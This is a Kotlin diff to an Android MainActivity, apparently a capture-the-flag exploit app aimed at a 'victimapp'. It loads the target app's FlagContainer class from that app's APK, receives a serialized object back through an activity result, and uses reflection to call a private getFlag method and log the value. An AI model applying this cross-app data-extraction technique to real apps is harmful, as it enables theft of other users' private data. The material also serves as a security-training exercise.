@@ -10,7 +10,6 @@ import android.util.Log
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 
-import dalvik.system.DexFile
 import dalvik.system.PathClassLoader
 
 import java.io.Serializable
@@ -40,7 +39,8 @@ class MainActivity : AppCompatActivity() {
                 )
             )
             .sourceDir
-        val containerClass = PathClassLoader(apk, classLoader)
+        val pathClassLoader = PathClassLoader(apk, classLoader)
+        val containerClass = pathClassLoader
             .loadClass("com.example.victimapp.FlagContainer")
             as Class<Serializable>
 
@@ -51,23 +51,19 @@ class MainActivity : AppCompatActivity() {
             )
         }
         val contract = ActivityResultContracts.StartActivityForResult()
-        registerForActivityResult(contract) { result ->
-            try {
-                val container = result
-                    .data
-                    ?.getSerializableExtra("flag", containerClass)
+        registerForActivityResult(contract) { it.data?.let { extras ->
+            extras.setExtrasClassLoader(pathClassLoader)
+            val container = extras
+                .getSerializableExtra("flag", containerClass)
 
-                container?.let {
-                    val flag = it
-                        .javaClass
-                        .getDeclaredMethod("getFlag")
-                        .apply { setAccessible(true) }
-                        .invoke(it)
-                    Log.d(TAG, "The flag is $flag")
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, e.toString())
+            container?.let {
+                val flag = it
+                    .javaClass
+                    .getDeclaredMethod("getFlag")
+                    .apply { setAccessible(true) }
+                    .invoke(it)
+                Log.d(TAG, "The flag is $flag")
             }
-        }.launch(intent)
+        }}.launch(intent)
     }
 }
